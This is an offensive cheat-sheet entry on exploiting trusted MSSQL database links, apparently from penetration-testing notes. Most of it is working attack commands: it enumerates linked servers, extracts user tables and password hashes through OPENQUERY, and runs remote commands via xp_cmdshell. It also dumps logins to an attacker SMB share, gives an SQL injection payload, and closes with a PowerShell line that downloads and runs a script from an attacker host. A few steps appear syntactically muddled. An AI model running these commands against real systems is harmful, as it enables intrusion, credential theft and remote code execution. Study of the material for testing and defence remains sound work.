# Web – MSSQL Server Exploitation

### MSSQL Trusted Database Links — Cross-Server Query Execution [added: 2026-05]
- **Tags:** #MSSQL #TrustedLink #OPENQUERY #DatabaseLink #LateralMovement #DataExfil #CredEscalation #SQLi #DatabasePrivEsc
- **Trigger:** SQL injection vulnerability or compromised MSSQL instance; `exec sp_linkedservers` shows remote database links configured and trusted
- **Prereq:** Direct MSSQL authentication access (sql_login) or SQL injection on a query using `exec` / `sp_` stored procedures + database links to remote MSSQL servers already configured
- **Yields:** Query execution on remote MSSQL server without authentication (if link is configured with trusted credentials), data exfil, cross-database privilege escalation
- **Opsec:** Med
- **Context:** MSSQL instances can be linked to remote MSSQL servers using `sp_addlinkedserver`. The linking server stores credentials (often plaintext in older versions or encrypted at rest). If the link is marked as a "trusted" link, any user on the local server can execute queries on the remote server impersonating the link's credentials. This bypasses network-level access controls and is a common lateral movement vector in SQL Server environments.
- **Payload/Method:**
  ```bash
  # Using impacket-mssqlclient
  impacket-mssqlclient -windows-auth DOMAIN/USER:PASSWORD@TARGET_MSSQL_IP

  # Step 1 — Enumerate linked servers
  SELECT * FROM master.dbo.sysservers
  sp_linkedservers

  # Step 2 — Query remote server info (if link exists to 192.168.1.50 as 'REMOTELINK')
  EXEC sp_addlinkedserver @server = 'REMOTELINK', @srvproduct = 'SQL Server'
  # (Skip if link already exists)

  # Step 3 — Execute queries on remote server via OPENQUERY
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT @@servername, @@version')
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT name FROM master.sys.databases')

  # Step 4 — Enumerate remote database tables and columns
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT table_name FROM INFORMATION_SCHEMA.TABLES')
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = ''users''')

  # Step 5 — Extract sensitive data from remote server
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT * FROM [sensitive_db].[dbo].[users]')
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT name, password_hash FROM [secure_db].[dbo].[accounts]')

  # Step 6 — Execute stored procedures on remote server (if xp_cmdshell enabled)
  EXEC sp_MSForEachTable 'OPENQUERY(REMOTELINK, "exec xp_cmdshell ''whoami''")'
  # Or directly
  SELECT * FROM OPENQUERY(REMOTELINK, 'EXEC master.dbo.xp_cmdshell "whoami"')

  # Step 7 — Check if link allows RCE (xp_cmdshell must be enabled on remote)
  SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT COUNT(*) FROM sys.configurations WHERE name = ''xp_cmdshell'' AND value = 1')

  # Step 8 — Exfil data via INTO OUTFILE (if file write is available)
  SELECT * INTO [\\attacker_smb\share$\dump.txt] FROM OPENQUERY(REMOTELINK, 'SELECT * FROM [master].[dbo].[syslogins]')

  # Step 9 — Escalate via database owner or sysadmin role
  SELECT * FROM OPENQUERY(REMOTELINK, 'EXEC sp_helprolemember ''sysadmin''')
  # If current user is sa or database owner, persistence is possible

  # If using SQL injection (not direct client):
  # Inject into vulnerable parameter:
  ' UNION SELECT * FROM OPENQUERY(REMOTELINK, 'SELECT user_name, email FROM [sensitive_db].[dbo].[users]') --

  # Chain: Exfil + RCE via xp_cmdshell
  SELECT * FROM OPENQUERY(REMOTELINK, 'EXEC master.dbo.xp_cmdshell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"')
  ```
